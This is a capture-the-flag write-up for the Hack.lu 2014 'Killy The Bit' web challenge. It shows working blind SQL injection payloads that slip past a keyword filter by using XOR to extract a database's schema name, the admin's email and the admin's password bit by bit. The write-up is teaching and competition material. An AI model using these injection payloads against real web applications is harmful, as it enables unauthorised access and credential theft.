## Hack.lu CTF 2014 - Killy The Bit (Web 200)
##### 21-23/10/2014 (48hr)
___

### Description: 
Killy the Bit is one of the dangerous kittens of the wild west. He already flip-
ped bits in most of the states and recently hacked the Royal Bank of Fluxembourg. 
All customer of the bank are now advised to change their password for the next 
release of the bank's website which will be launched on the 23.10.2014 10:01 CEST. 

Killy the Bit stands in your debt and sent the following link. Can you break the 
password generation process in order to get access to the admin account?	

___
### Solution

The source code reveals that this is an Blind SQL injection. The filters are: sleep, 
benchmark, and, or, |, &. However things can become more difficult because we can't use
names like ORD() (contains 'or'), or INFROMATION_SCHEMA.tables (contains 'or' too). Let's
try to craft 2 valid sql injection statements:

First we create a statement that returns TRUE:
```
	SELECT name,email 
	FROM user 
	WHERE name=' UNION ALL SELECT name, email FROM user WHERE 1=1--  
```
	
The page that returned to user, contains the following response: "A new password was 
generated and sent to your email address!". Now let's create the FALSE statement:
```
	SELECT name,email 
	FROM user 
	WHERE name=' UNION ALL SELECT name, email FROM user WHERE 1=0--  
```

The page that returned contains this time the message: "We couldn't find your username!
Are you sure it is ' UNION ALL SELECT name, email FROM user WHERE 1=0-- ?"

Awesome! Now we have a way to extract data from the database. We can extract 1 bit of 
information at a time. The classic way to do this is by reading a character and getting 
the value of each bit (we need 8 requests for each character). In order to do this we
need the & operator:
```
	if( character & 128 == 0 ) 1st bit = 0. else 1st bit = 1
	if( character & 64  == 0 ) 2nd bit = 0. else 2nd bit = 1
	.... and so on.
```
	
The other way is to do a binary search (< and > are allowed), but we'll do something 
different: & and | are not allowed, but XOR is allowed: ^

So, how we can check the value of a specified bit using XOR? Consider a number x. Then:
```
	if( x^128 > x ) then 1st bit = 0 else 1st bit = 1
	if( x^64  > x ) then 2nd bit = 0 else 2nd bit = 1
	.... and so on.
```
	
But why this is right? If MSBit of x is 1 then by XORing it with 128=1000000(2) we'll flip
the MSBit. If the bit was 0 then by flipping it the result will be greater that the initial
number. But if the bit was 1, after flipping will be 0, and the result will be smaller than
the initial value.
Now, let's start by finding the database name. The query we insert is:
```
	?name='+UNION+ALL+SELECT+name,email+
		FROM+user+
		WHERE+ASCII(SUBSTR(SCHEMA(),$_i_$,1))>
		     (ASCII(SUBSTR(SCHEMA(),$_i_$,1))^$_mask_$)--+	
	&submit=Generate#
```
	
Where the variable $_i_$ gets the values 1,2,3... and the variable $_mask_$ the values 128,
64,32,16,8,4,2 and 1. After executing the script (see below) we can get the database name:
```
	ctf-level
```
	
Now let's get admin's email. The query is:
```
	?name='+UNION+ALL+SELECT+name,email+
		FROM+user+
		WHERE+ASCII(SUBSTR((SELECT email FROM user WHERE name='admin'),$_i_$,1))>
		     (ASCII(SUBSTR((SELECT email FROM user WHERE name='admin'),$_i_$,1))^$_mask_$)--+
	&submit=Generate#
```

After many requests, we get the admin's email: admin@bankoffluxembourg.com
But we want admin's password. We have a table, and it has 2 columns "name" and "email". It's very
like to has a column for the password. Let's try common names for password columns: "pass", "pw", 
"passwd", "password" (cannot be used -> contains 'or'). We find that the correct column name is
"passwd". Now let's get the admin's password:

```
	?name='+UNION+ALL+SELECT+name,email+
		FROM+user+
		WHERE+ASCII(SUBSTR((SELECT passwd FROM user WHERE name='admin'),$_i_$,1))>
		     (ASCII(SUBSTR((SELECT passwd FROM user WHERE name='admin'),$_i_$,1))^$_mask_$)--+
		&submit=Generate#
```

After many requests, we get the flag: **flag{Killy_The_Bit_Is_Wanted_for_9000_$$_FoR_FlipPing_Bits}**.


___

After getting the flag, the authors post the following hints:

Hint: Blind SQLi is not a good solution. You can get the correct and complete flag with one single request!

Hint: The password's column name is 'passwd'.

:(

___